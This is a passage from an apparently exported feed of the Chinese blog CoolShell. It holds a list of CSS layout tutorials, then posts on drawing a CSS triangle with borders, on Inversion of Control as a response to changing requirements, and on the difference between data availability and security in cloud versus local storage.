<p>1-<a href="https://woork.blogspot.com/2008/01/three-column-fixed-layout-structure.html">使用CSS完成三栏固定布局结构</a>– 这篇文章解释了如何实现一个基于的HTML/CSS来设计一个简单的带有基本要素（顶部的logo条，导航条，文本区，定义分类的中部栏，右边侧栏插入google的120X600的广告区）的固定三栏页面布局。</p>
<p><img alt="image placeholder" ></p>
<p>2-<a href="https://woork.blogspot.com/2007/10/design-page-layout-using-css.html">使用CSS设计页面布局</a>– 如何使用CSS文件来为你的站点设计页面布局。<br>
<img alt="image placeholder" ></p>
<p>3-<a href="https://css-tricks.com/how-to-create-a-horizontally-scrolling-site/">如何创建一个水平布局的站点</a>– 创建不同于常规的水平布局的站点技术（译者注：水平布局，客户体验也就仁者见仁了）</p>
<p><img alt="image placeholder" ><br>
例子<a href="https://css-tricks.com/examples/HorzScrolling">查看这里</a> |<a href="https://css-tricks.com/examples/HorzScrolling.zip">下载</a></p>
<p>4-<a href="https://css-tricks.com/super-simple-two-column-layout/">超级简单的两栏布局</a>– 创建不同于常规的水平布局的站点技术（译者注：这里是原作者笔误吧和上面的内容一样）.</p>
<p><img alt="image placeholder" ></p>
<p>例子<a href="https://css-tricks.com/examples/SuperSimpleTwoColumn">查看这里</a> <a href="https://css-tricks.com/examples/SuperSimpleTwoColumn.zip">下载</a></p>
<p>5-<a href="http://www.456bereastreet.com/lab/developing_with_web_standards/csslayout/2-col/">简单两栏CSS布局</a>– 这是一个创建简单两栏布局的教程。这种布局包含了一个标题区，一个水平导航条，主内容区，边侧栏，和页脚区。并且这个布局是水平居中的。</p>
<p><img alt="image placeholder" ></p>
<p>例子<a href="http://www.456bereastreet.com/lab/developing_with_web_standards/csslayout/2-col/finished.html">查看这里</a></p>
<p>6-<a href="http://dnevnikeklektika.com/en/the-holy-grail-layout-3-columns-and-a-lot-less-problems">圣杯布局(The holy grail layout)</a> – 3栏布局会有一些问题 ，这篇文章讨论了一种三栏布局——两栏固定宽度边侧栏加上一栏变宽中栏布局，保证了页面的良好结构和清晰。</p>
<p><img alt="image placeholder" ></p>
<p>例子<a href="http://dnevnikeklektika.com/css/3ColLayout/working.html">查看这里</a></p>
<p>7-<a href="http://www.simplebits.com/notebook/2004/09/08/centering.html">CSS居中101</a>– 如何使用CSS完成居中一个固定宽度的布局</p>
<p>使用CSS，通过下面两条规则完成对id为container的DIV所包含的内容居中</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;body&gt;
 &lt;div id="container"&gt; ...entire layout goes here...
&lt;/div&gt;
&lt;/body&gt;
</pre>
<br>
<pre data-enlighter-language="css" class="EnlighterJSRAW">body {
    text-align: center;
}
#container {
    margin: 0 auto;
    width: xxxpx;
    text-align: left;
}
</pre>
<p>8-<a href="http://www.subcide.com/tutorials/csslayout/index.aspx">从头创建CSS布局</a>– 这个指南通过创建一个全功能的 CSS布局来一步步教你入门CSS布局。</p>
<p><img alt="image placeholder" ></p>
<p>9-<a href="http://www.alistapart.com/articles/multicolumnlayouts/">非主流！多栏布局</a>– 多栏布局，等高栏（每一列的高度都相等），固定或变宽中央区，简洁标记，CSS 。(译者注：原文作者的图配的和上图一样)</p>
<p><img alt="image placeholder" ></p>
<p>例子<a href="http://www.alistapart.com/d/multicolumnlayouts/3ColLiquid.html">查看这里</a></p>
<p>10- <a href="http://www.positioniseverything.net/articles/onetruelayout/">创建天下无双的CSS布局</a>– 高灵活性布局,等高栏，跨栏垂直摆放元素。本文告诉你通过何等手段完成这些目标，并使用它们创建天下无双的CSS布局（译者注:原文是One True Layout ，不知道怎么翻译，就天下无双吧。）</p>
<p><img alt="image placeholder" ></p>
<p><a href="http://www.positioniseverything.net/articles/onetruelayout/examples">查看这里</a></p>
<p>11-<a href="http://nettuts.com/site-builds/from-psd-to-html-building-a-set-of-website-designs-step-by-step/">从PSD到HTML，手把手完成WEB设计</a>-从Photoshop到完整HTML，全过程手把手教会你。</p>
<p><img alt="image placeholder" ></p>
<p>例子<a href="https://nettuts.s3.amazonaws.com/017_Creatif/Site/index.html">查看这里</a> | <a href="https://nettuts.s3.amazonaws.com/017_Creatif/Site_Download.zip">下载</a></p>
<p>12- <a href="http://tutorialblog.org/5-tips-for-coding-xhtmlcss-layouts/">5个XHTML/CSS技巧</a> – 5个CSS技巧帮助你完成从基于表格的布局到基于CSS的布局。</p>
<p>13-<a href="http://veerle.duoh.com/index.php/blog/comments/designing_a_css_based_template_part_i/">设计一个基于CSS的模板</a> – 这是一个教你创建基于CSS的模板页的基础教程。这个教程由下面几个部分构成：第一部分覆盖了在Photoshop CS*中的创建导航条按钮，第二部分：创建背景接下来的清单是标题和页面布局，最后的部分在XHTML和CSS中实现。</p>
<p><img alt="image placeholder" ></p>
<p><a href="http://homepage.mac.com/vpieters/css_step2/step2_whooshes.mov.zip">下载</a></p>
<p>14-<a href="http://www.sitepoint.com/article/breaking-out-of-the-box">使用CSS布局跳出常规布局</a>– 如果你理解了基于表格布局的工作方式，你能通过合并或拆分表格创建你随心所欲的布局。就这个目标（同时支持灵活性和可维护性），CSS能够提供比基于表格更多地东西。Jina Bolton的教程解释如何达到这个目标。</p>
<p><img alt="image placeholder" ></p>
<p>15-<a href="http://www.webreference.com/authoring/style/sheets/layout/advanced/">高级CSS教程:手把手</a>– 这个教程的终极目标创建一个CSS布局，这个CSS布局精确地重组了原有使用table的WebReference.com的布局。</p>
<p><img alt="image placeholder" ></p>
<p>16-<a href="http://snook.ca/archives/html_and_css/six_keys_to_understanding_css_layouts/">了解CSS布局的6个关键要素</a>-本文讲述了6件基于CSS布局需要了解的事情：盒模型(Box Model)，浮动栏(Floated Columns) （译者注：float是WEB布局最重要的一个属性了）。使用Em来设置尺寸（Sizing Using Ems），图片替换（Image Replacement）,浮动导航和Sprintes。</p>
<p>17-<a href="http://wisdump.com/design/are-you-making-these-common-blog-layout-mistakes/">你会犯这些常见的博客布局错误吗？</a>-讨论4个博客布局中常见而且易修复的错误。</p>
<p>18-<a href="http://www.htmldog.com/guides/cssadvanced/layout/">页面布局</a>-CSS页面布局中的浮动元素和定位元素实践指导。</p>
<p>你可以查看这些例子：<a href="http://www.htmldog.com/examples/positioning4.html">Absolute Position within a relative box</a><a href="http://www.htmldog.com/examples/float2.html"> two floated boxes</a>和<a href="http://www.htmldog.com/examples/pagelayout3.html"> using a border to provide the background for a column</a></p>
<p>19-<a href="http://leftjustified.net/site-in-an-hour/">Site in an Hour</a>– 使用复杂CCS布局完成简单的工作。</p>
<p><img alt="image placeholder" ></p>
<h4><strong><span style="color: #008000;">关于布局的最佳资源</span></strong></h4>
<p>下面的大多数这些资源不需要许可就能直接使用，然而，其中的一些需要先发邮件确认一下是否可以使用这些资源。因此，在使用之前最好先检查资源的版权信息。</p>
<p>20-<a href="http://www.maxdesign.com.au/presentation/page_layouts/">简单CSS页面布局</a>– 这里有一套2栏和3栏的CSS布局。</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例<a href="http://www.maxdesign.com.au/presentation/process/example23.htm"> Liquid three column layout</a>,<a href="http://www.maxdesign.com.au/presentation/page_layouts/single04.htm"> Left aligned, set width</a> and <a href="http://www.maxdesign.com.au/presentation/liquid/example13.htm">Liquid insanity</a>.</p>
<p>21-<a href="http://matthewjamestaylor.com/blog/perfect-3-column.htm">完美的三栏变宽布局（百分比定宽度）The Perfect 3 Column Liquid Layout (Percentage widths)</a>– 没有CSS hack（译者注：不知道怎么翻译，点击<a href="https://baike.baidu.com/view/1119452.htm">这里</a>查看解释）. 良好地收索引擎优化.无图. 无Javascript. 跨浏览器 和IPHONE设备兼容</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看样例 <a href="http://www.maxdesign.com.au/presentation/process/example23.htm">Liquid three column layout</a>, <a href="http://www.maxdesign.com.au/presentation/page_layouts/single04.htm">Left aligned, set width</a> 和 <a href="http://www.maxdesign.com.au/presentation/liquid/example13.htm">Liquid insanity</a>. (译者注：这里的链接和上面重复了，哎，原文的错误吧)</p>
<p>22-<a href="http://www.intensivstation.ch/en/templates/">CSS模板和样例</a></p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例<a href="http://www.intensivstation.ch/files/en_templates/temp06.html"> 3 columns fixed</a> <a href="http://www.intensivstation.ch/files/en_templates/temp06.html">centered</a>, <a href="http://www.intensivstation.ch/files/en_templates/temp11.html">fixed Box totally</a><a href="http://www.intensivstation.ch/files/en_templates/temp11.html">centered</a> and <a href="http://www.intensivstation.ch/files/en_templates/temp03.html">3 columns, all</a><a href="http://www.intensivstation.ch/files/en_templates/temp03.html">dynamic</a></p>
<p>23-<a href="http://layouts.ironmyers.com/">IM 布局</a>– IM 布局是一种简单地的CSS布局系统，IM布局提供了全A级的浏览器的支持。</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例:<a href="http://www.ironmyers.com/examples/three_column_layout.html"> The Holy Grail 3 Column Layout</a>, <a href="http://www.ironmyers.com/examples/classic_blog.html">The Classic Blog Layout </a>和<a href="http://www.ironmyers.com/examples/multi_column.html"> The Multi Column Layout.</a></p>
<p>24-<a href="http://www.cssplay.co.uk/layouts/index.html">CSSplay </a>– CSS布局列表</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例:<a href="http://www.cssplay.co.uk/layouts/fixit.html">Cross browser FIXED</a>, <a href="http://www.cssplay.co.uk/layouts/threecol.html">Three columns</a> and <a href="http://www.cssplay.co.uk/layouts/frame.html">CSS Frame – The Holy Grill</a>.</p>
<p>25-<a href="http://blog.html.it/layoutgala/">Layoutgala </a>– 基于同样的的标记l得到最大数量的不同的布局方式。没有CCS hack，没有CSS workaround ，良好的浏览器兼容性。40种不同布局。</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例:<a href="http://blog.html.it/layoutgala/LayoutGala07.html">Three fixed Columns</a>, <a href="http://blog.html.it/layoutgala/LayoutGala04.html">Three percentage columns</a> and <a href="http://blog.html.it/layoutgala/LayoutGala19.html">Liquid, three columns, hybrid widths </a>(吐槽：没有等高，不好看).</p>
<p>26-<a href="http://www.glish.com/css/">Glish</a>– 许多有用的跨浏览器布局技术</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例: <a href="http://www.glish.com/css/7.asp">3 columns, the holy grail</a>,<a href="http://www.glish.com/css/9.asp"> 2 columns, ALA style</a> and <a href="http://www.glish.com/css/2.asp">3 columns, all fluid </a></p>
<p>27-<a href="http://www.thenoodleincident.com/tutorials/box_lesson/boxes.html">Thenoodleincident</a>– CSS 从简单的单盒到3盒并增加一个顶部条，所有都是变宽。</p>
<p><img alt="image placeholder" ></p>
<p>28-<a href="http://www.bluerobot.com/web/layouts/">The Layout Reservoir</a>– 很多有用的CSS布局技术</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例:<a href="http://bluerobot.com/web/layouts/layout1.html"> 2 columns – left menu</a>,<a href="http://bluerobot.com/web/layouts/layout3.html"> 3 columns – flanking menus</a>和<a href="http://bluerobot.com/web/css/center1.html"> Auto-width Margins </a>.</p>
<p>29-<a href="http://www.strictlycss.com/articles/article/40/the-only-css-layout-you-need">The only CSS layout you need</a>– 在这篇文章中将会为你展现10个基于同一的HTML的不同的的布局。</p>
<p><img alt="image placeholder" ></p>
<p>你可以通过这里查看这些样例: <a href="http://www.strictlycss.com/examples/three-column-layout-1.asp"> Three column CSS layout – left and right menu</a>, <a href="http://www.strictlycss.com/examples/three-column-layout-2.asp">Two column CSS layout – top and left menu</a> 和 <a href="http://www.strictlycss.com/examples/three-column-layout-7.asp">Three column CSS fluid layout: 100% width</a></p>
<p>30-<a href="http://www.yaml.de/">另一个多栏布局</a>-是一个创建当代流行的变宽的浮动布局的XHTML/CSS框架。这是一个多功能实用的布局。</p>
<p>点击<a href="http://www.yaml.de/fileadmin/download/release_306/yaml_306_080609.zip">这里</a>下载.</p>
<p>31-<a href="http://www.cssliquid.com/">Liquid Designs</a>– 使用XHTML和CSS的变宽设计库。</p>
<h4><strong><span style="color: #008000;">最佳实践</span></strong></h4>
<p>如果你需要寻找一些布局灵感，你可以从下面的网站链接中找到。这些站点演示了CSS布局如何应用于不同类型的网站。查看这些网站是如何分成2栏或3栏，或混合宽栏和窄栏布局。</p>
<p>32-<a href="http://helldesign.net/">Helldesign</a></p>
<p><img alt="image placeholder" ></p>
<p>33-<a href="http://silverbackapp.com/">Silverbackapp</a></p>
<p><img alt="image placeholder" ></p>
<p>34-<a href="http://www.os.ca/accueil.php">OS communications informatiques</a></p>
<p><img alt="image placeholder" ></p>
<p>35-<a href="http://rockatee.com/">Rockatee</a></p>
<p><img alt="image placeholder" ></p>
<p>36-<a href="http://www.darrenhoyt.com/">Darrenhoyt</a></p>
<p><img alt="image placeholder" ></p>
<p>37-<a href="http://www.makebetterwebsites.com/">Makebetterwebsites</a></p>
<p><img alt="image placeholder" ></p>
<p>38-<a href="http://elitetheme.com/">Elitetheme</a></p>
<p><img alt="image placeholder" ></p>
<p>39-<a href="http://www.studio7designs.com/">Studio7designs</a></p>
<p><img alt="image placeholder" ></p>
<p>40-<a href="http://brightcreative.com/">Brightcreative</a></p>
<p><img alt="image placeholder" ></p>
<p><em>(全文完)</em></p>
 ]]></content>
<pubDate>2012-03-19T08:25:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/6840.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 神奇的CSS形状 ]]></title>
<link>https://coolshell.cn/articles/6913.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;">感谢 Neo 投递本文 – 微博帐号</span>：<a title="_锟_" href="https://weibo.com/gandalfthegrey" target="_blank">@_锟_</a> 】</p>
<p style="text-align: left;">在StackOverflow上有这么一个问题，有位同学在<a href="https://css-tricks.com/examples/ShapesOfCSS/">http://css-tricks.com/examples/ShapesOfCSS/ </a> 找到一些使用CSS做的形状，其中一位同学对下面的这个形状充满了疑问。</p>
<p style="text-align: left;">形状是：</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">代码是：</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#triangle-up {
width: 0;
height: 0;
border-left: 50px solid transparent;
border-right: 50px solid transparent;
border-bottom: 100px solid red;
}
</pre>
<p>这位同学就提问啦，为啥这么这么几句就能画出一个三角形呢？<br>
于是呢，有高人出现，这个高人图文并茂的解释了这个三角的成因</p>
<p><span id="more-6913"></span><br>
首先呢，我们需要了解HTML标记的Box Model（盒模型），这个例子中呢我们将content，padding都看作content。忽略掉margin。那么一个盒模型就是下图</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p>中间是内容，然后是4条边。每一条边都有宽度。<br>
根据上面CSS的定义，没有border-top（顶边）的情形下 ,我们的图形如下：</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p>width设置为0后 ，内容没有了就成为下图：</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p>height也设置为0，只有底边了。</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p>然后两条边都是设置为透明，最后我们就得到了</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p>这个属于奇技淫巧，但是也说明CSS的强大，没有做不到只有想不到。另外<a href="https://css-tricks.com/examples/ShapesOfCSS/">http://css-tricks.com/examples/ShapesOfCSS/ </a>还能找到很多其他的形状，感兴趣的同学可以自己去看。还有酷壳以前的这篇文章《<a title="CSS图形" href="https://coolshell.cn/articles/5164.html" target="_blank">CSS实现的各种形状</a>》</p>
 ]]></content>
<pubDate>2012-03-24T20:35:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/6913.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 需求变化与IoC ]]></title>
<link>https://coolshell.cn/articles/6950.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;">感谢 Todd投递本文 – 微博帐号</span>：@<a title="weidagang" onclick="pageTracker._trackPageview('/outgoing/weibo.com/weidagang?referer=http%3A%2F%2Fcoolshell.cn%2F');" href="https://weibo.com/weidagang" target="_blank">weidagang</a> 】</p>
<h4>需求又变了，怎么办？</h4>
<p>先上一个轻松的段子：</p>
<blockquote><p>程序员XX遭遇车祸成植物人，医生说活下来的希望只有万分之一，唤醒更为渺茫。可他的Lead和亲人没有放弃，他们根据XX工作如命的作风，每天都在他身边念：“XX，需求又改了，该干活了，你快来呀！”，奇迹终于发生了，XX醒来了，第一句话：“需求又改了？”。</p></blockquote>
<p>这个段子用幽默的方式反映了需求变化是每一个程序员、架构师或项目经理都会经常遇到的问题。面对这个问题，不同的人有不同的应对之道，最近微博上有一段关于需求变化的讨论：</p>
<blockquote>
<p>@假装刺猬的猪：我们在软件开发过程中，会持续碰到客户需求变更的情况。如果没有领域建模，我们单纯将问题使用直觉将问题解决，那么等到客户需求变更或者有新的需求时，就会面临一个僵硬的前设计！无法在以前的设计上持续深入的优化模型，导致需求变更无法及时深化。设计实现均滞后与变更！</p>
<p>@高煥堂: &lt;碰到客户需求变更的情况&gt;是合理的；但&lt;领域建模&gt;不是美好的手段!!!</p>
<p>@weidagang: 要不被客户牵着鼻子走，需要自己有很强的设计能力，<strong>反过来</strong>让客户跟着你的设计来满足你的要求。能做到这点的公司很少，但这是软件行业唯一有希望的出路。</p>
<p>@高煥堂: &lt;这是软件行业唯一有希望的出路&gt;。 Great!!</p>
</blockquote>
<p>如何应对需求变化？ @假装刺猬的猪 的答案是领域建模，并持续优化模型，适应需求的变化。@高煥堂 则认为领域建模不是美好的手段。我进一步补充，应该<strong>“反过来”</strong>让自己在需求变化中处于主导地位，而不是被动地适应。</p>
<p><span id="more-6950"></span></p>
<h4>控制反转 (IoC)</h4>
<p>什么样就算是“反过来”了呢？举个例子：</p>
<blockquote><p>用户想购买一台普通PC，他只想电脑能流畅运行魔兽世界，他根本不想知道什么叫主板，什么叫内存，什么叫CPU；但他不得不接受必须购买主板、CPU、内存的事实，因为PC架构是产业标准，而不是由用户定的。客户有选择的权利，但没有设计的权利，客户的需求必须在设计框架下得到满足。</p></blockquote>
<p>这里我们要问PC架构是保护了谁的利益？显然，直接的受益者是厂商。如果没有PC架构的保护，厂商就会直接面对客户，客户说我需要功能A，我马上分析设计实现功能A；客户说我要功能B，我马上分析设计实现功能B … 有了PC架构的保护，厂商就变得更加强势，用户的一切需求都必须在PC架构下来谈。厂商可以倾听用户的声音，不断改进产品，但设计主导权永远在自己手中。我们IT行业常常用“做产品”和“做项目”的视角来区分不同的公司，但很少有人用“做设计”的视角来看。实际上，关键的问题在于设计主导权是厂商还是在客户。如果设计主导权在客户，不管是做产品、做服务还是做项目，其命运必然是疲于奔命应付客户，最后获得微薄的利润；如果设计主导权在厂商，不管做产品、做服务还是做项目都能有更多的话语权和更高的利润。</p>
<p>当然，光有设计还不够，必须客户接受才能起到通过设计掌握主导权的作用。这一方面需要自己具有很强的设计能力，如苹果就是以设计能力著称的公司；另一方面，和其他厂商结盟壮大阵营也是一种方法，如最著名的Wintel联盟(Windows+Intel)，以及现在的日益壮大的Android阵营都属于此类。假如有厂商不遵守PC产业标准，说我的PC就没有主板，没有显卡，因为用户更不不需要这些东西；那么，它要么像苹果一样独树一帜成为一种新的标准，要么无人问津。</p>
<p>我所谈到的“反过来”本质上就是软件设计中的控制反转 (Inversion of Control, IoC)思想。IoC是每一个初级程序员向高级进阶所需要了解的<strong>最重要</strong>的设计思想。由于Spring等开发框架的流行，知道IoC概念的程序员不在少数，但不少人对于IoC的理解仅仅停留在通过依赖注入 (Dependency Injection)实现解耦这个层面。实际上，IoC的应用不仅包括解耦，它还是框架的基本原理，在非计算机领域，IoC也是无处不在，如果你能从上面的例子中体会到IoC，这才算是融会贯通了。</p>
<p>软件开发中一种最常见的模式是“以用户为出发点，以需求分析为核心”。该模式提倡从用户需求中分析推导出设计和实现，比如，TDD式的设计正是这类典型。而IoC式的软件设计与此截然相反，IoC的设计是一种“以愿景（自身利益是愿景的重要方面）为出发点，以架构为核心”的模式。如果用户的需求是一台电脑，我们如何能通过第一种模式分析需求推导出“主板-CPU-内存-外设”的PC架构呢？恐怕很难。IoC式的设计是以用户看不见摸不着的架构为核心，自己主导设计，用户需求是设计的约束条件和验证手段，而不是出发点和目标。我们想要掌握主动，不被需求变化搞得疲于奔命，就必须熟练使用第二种模式。</p>
<p>我们的人生都被环境和各种客观条件所束缚，多数人只能随波逐流，听从命运的安排。你有没有想过要拥有人生的主导权呢？既然你是程序员，你懂IoC，你能否设计自己的人生框架呢？Yes，you can!</p>
 ]]></content>
<pubDate>2012-03-26T11:01:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/6950.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 谈谈数据安全和云存储 ]]></title>
<link>https://coolshell.cn/articles/6976.html</link>
<content><![CDATA[ 
<p>前些天，创新工场李开复同学<a title="李开复：数据存在大公司比身边安全 不信问陈冠希" href="https://weibo.com/1197161814/ycNUWw7hz" target="_blank">在2012博鳌亚洲论坛表示</a>：</p>
<blockquote><p>“你们有多少人丢过手机？大概有15%。你们有多少人数据放在微软掉过的？我想不见得很多吧。所以相对来说是安全的。<strong>放在大公司里比自己拿着掉的概率更大，你不相信的话，可以问陈冠希先生。</strong>”</p></blockquote>
<p><img alt="image placeholder" ></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%A4%E7%A7%8D%E5%AE%89%E5%85%A8" title="两种安全">两种安全</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Security_-_%E6%9C%AC%E5%9C%B0_vs_%E4%BA%91%E7%AB%AF" title="Security – 本地 vs 云端">Security – 本地 vs 云端</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Availability_-_%E6%9C%AC%E5%9C%B0_vs_%E4%BA%91%E7%AB%AF" title="Availability – 本地 vs 云端">Availability – 本地 vs 云端</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%AE%B6%E5%BA%AD%E7%A7%81%E6%9C%89%E4%BA%91%E5%AD%98%E5%82%A8" title="家庭私有云存储">家庭私有云存储</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%A4%E7%A7%8D%E5%AE%89%E5%85%A8"></span>两种安全<span class="ez-toc-section-end"></span>
</h4>
<p>看到这个消息的时候，我觉得李开复同学混淆了云存储和安全这两个概念，在英文里，有两个单词，<strong>一个是Safety，一个是Security，很不幸的是，这两个英文单词翻译成中文都叫“安全”</strong>，因此总是被混淆，熟知英文又熟悉IT业的李开复同学在这个句子中混淆了这“两种安全”，我在<a href="https://weibo.com/haoel" target="_blank">我的微博</a>上指出来后，居然还有很多网友继续混淆这两点，所以，这让我产生了写篇博文的说明一下，并顺着说说云存储和数据安全的个人理解。</p>
<p><span id="more-6976"></span></p>
<ul>
<li>
<strong>所谓Safety，也就是数据不丢失的意思。</strong>这是目前云存储解决的问题，你可以把你的数据放在云端，你的所有的终端设备都可以通过云端来共享同步你的数据，这样，<strong>云端就成了你数据同步和备份的数据中枢</strong>。<strong>说得专业一点，这又叫Availability</strong>，中文叫可用性，意思是，你的数据总是可用的，基本不会丢失 ，</li>
</ul>
<ul>
<li>
<strong>所谓Security，也就是数据的隐私和不泄露</strong>。这就是德艺双馨的陈冠希老师的痛，因为本来隐私和机密的数据被泄露出去了。就目前而言，我看到的云存储解决的都是Availability，而不是Security。Security解决的是私密和不泄露的问题。所以，李开复同学要让陈冠希老师把他的那些数据存到云端是可笑的，<strong>对于那些私密照片，我相信陈冠希老师要求的是“Security”，而不是“Availability”</strong>。</li>
</ul>
<p>有网友在我的微博上指出：”一种数据是不能丢，但是可以泄露，那可以放云端，另一种是宁可丢都不能泄露，这就不能放在云端了”。这句话可以帮你更好地理解什么是Availability和Security。</p>
<h4>
<span class="ez-toc-section" id="Security_-_%E6%9C%AC%E5%9C%B0_vs_%E4%BA%91%E7%AB%AF"></span>Security – 本地 vs 云端<span class="ez-toc-section-end"></span>
</h4>
<p>现在的云解决的更多的是不丢失，而不是不泄漏。有一些网友在微博上和我争论道，其实云存储也能保证Security，因为有加密认证，云端会加密数据。我对此存有不同意见，<strong>对于Security，我个人更觉得，Security的数据应该完全私有化，所以，放在本地会有更好的Security</strong>。我的理由如下：</p>
<ul>
<li>先问你自己一个问题，无论是不是大公司的云服务，你敢把你的银行帐号和口令存在云端吗？你的银行帐号和口令你可能都不敢放在你的电脑里。因为你要找到一个完全绝对只有你能访问的地方。比如说你的大脑。</li>
</ul>
<ul>
<li>云端的认证和云端的数据加密有用吗？没有用的，因为我只要破解了这个用户口令，想想你的电脑成了肉鸡，你网盘的口令都不要，你云端的数据一下都成了浮云了。想想去年年底各大网站的口令泄露吧。</li>
</ul>
<ul>
<li>数据存放在本地的移动硬盘上时，只有你的电脑同时插着USB链接线了上网线时，别人才有机会入侵，一旦你发现入侵，你还可以拔线。而你的数据放在云端，黑客可以全天候地入侵你的云端数据，得手后你都不知道你自己的帐号被黑了。</li>
</ul>
<ul>
<li>无论是云端或是本地都防不住你的客户端被肉鸡，而云端还要面对比本地更多的风险，比如，云端无良员工，云端的代码漏洞，云端的黑客入侵，还有电邮电话诈骗，钓鱼网站，DNS劫持，政府审查，等等，等等。</li>
</ul>
<p>看看银行和金融行业，完全是自己的专用网络，和互联网物理隔绝，这就是为了Security。Security就必需是完全绝对的对数据的私有化。比如某些公司的电脑不能使用USB，光驱等等外设，所有内网与外网的数据交换都必需受到监控。</p>
<p>再多说一点，其实，要黑你的云端帐号并不用很高深的技术，有调查表明，伪装成客服人员或是警察给你打个电话问你要口令，大多数人是会告诉自己的帐号和口令的。还有就是抓住人的占便宜的心理，比如：在大街上撒U盘，大多数人是会捡回去插在自己或公司的电脑上浏览里面的内容的。</p>
<p>所以，所谓物理隔绝不单单只是网线，还有这些外设。</p>
<h4>
<span class="ez-toc-section" id="Availability_-_%E6%9C%AC%E5%9C%B0_vs_%E4%BA%91%E7%AB%AF"></span>Availability – 本地 vs 云端<span class="ez-toc-section-end"></span>
</h4>
<p>硬盘是有寿命的，如果你不间断开机，你的硬盘估计也就能支持5年左右。光盘也是有寿命，因为是塑料也会老化的，和存放的条件有关。所以，在本地看来，数据总是容易丢失的。因为我们本地的存储设备并不可靠，只是家用级的，不是工业级的。</p>
<p>云存储可以使用RAID之类的家庭里用不到的技术来镜像数据等技术手机，从而可以保证可用性很高，所以，放在云端的数据库可用性会更高一些（当然，就像开复老师说的一样还是要大公司才靠谱）。</p>
<p>再多说一点，现在很多云存储仅仅只是做简单的和客户端本地的数据同步，没有版本控制，这意味着，如果你本地的文件本来是好的，但是后来你的电脑中了病毒后，你本地的数据被损坏了，不幸的是，这些被损坏的数据也同步到了云端，并分发到了你所有的终端设备中，于是灾难还是一样发生。所以，不支持版本控制，或是更轻量一些的“数据快照”功能的云，其实其数据并不Safe。</p>
<h4>
<span class="ez-toc-section" id="%E5%AE%B6%E5%BA%AD%E7%A7%81%E6%9C%89%E4%BA%91%E5%AD%98%E5%82%A8"></span>家庭私有云存储<span class="ez-toc-section-end"></span>
</h4>
<p>云存储，对于PC用户来说，就目前而言，最多的应用还是那些各种各样的Dropbox类的网盘应用，这些应用很好地解决了数据的——备份、同步、共享这三个问题。但是，我觉得还是有一些如下问题没有解决。</p>
<ul>
<li>Security问题。就是陈冠希老师的数据私密性的问题。</li>
<li>费用问题。相对于本地的存储来说，网盘费用太高了，还是一月或一年的算，Dropbox 100GB的网盘要200USD一年，这够买两个1TB的硬盘了，而且绝对可以用超过1年以上。</li>
<li>备份效率问题。通过网络备份，同步和共享，对于数据量大一点，效率太差了。</li>
</ul>
<p>我不知道大家怎么样？我现在更多的数据备份是我的一些家庭照片和视频，随着现在的数码相机的像素越来越高，一张照片的大小可以在4MB甚至10M，数据量太大了。而且，这些照片都个人的照片，不能传到网上做备份。每次在我的SD卡，PC，移动硬盘，iPad，手机上倒腾这些照片和视频的时候，总是很麻烦。（我昨晚在微博上<a href="https://weibo.com/1401880315/ydGN1zXGz">做了个小调查</a>，发现很多人家里是有很多设备的，像我这样，家里有3个本，2个台式机，2个kindle，1个iPad，2个智能手机，1个高清播放机的家庭都算是比较节俭的了）</p>
<p><strong>我觉得就目前这样的情况，个人家庭的私有云解决方案应该要出现了</strong>。也就是家庭内的数据中心解决方案，也许只需要像高清播放机那样的一个小盒子，里面可以用软件RAID两块或多块硬盘以保证数据的可用性，其还可以让你的数据在N多设备中共享，同步，备份，但你又不用担心互联网安全来担心这些数据，因为这仅仅是你的家庭局域网。</p>
<p>因为小孩让家庭照片和视频暴增，导致我去年就在想应该有一个家庭私有网盘的东西，所以，当我前些天看到<a href="http://www.spacemonkey.com/" target="_blank">Space Monkey</a> （<a href="http://news.cnet.com/8301-19882_3-57391989-250/dropbox-rival-space-monkey-puts-cloud-in-your-house/" target="_blank">新闻报道</a>）的时候，我立马就觉得这就是我想要的东西。</p>
<p><img alt="image placeholder" ></p>
<p>不过，国内还没有相应的产品，有想法的同学不妨试试去做一个类似于这样的产品，动作要快，千万不要让创新工场和腾讯抢先了。;-)</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-04-09T08:33:22+08:00</pubDate>
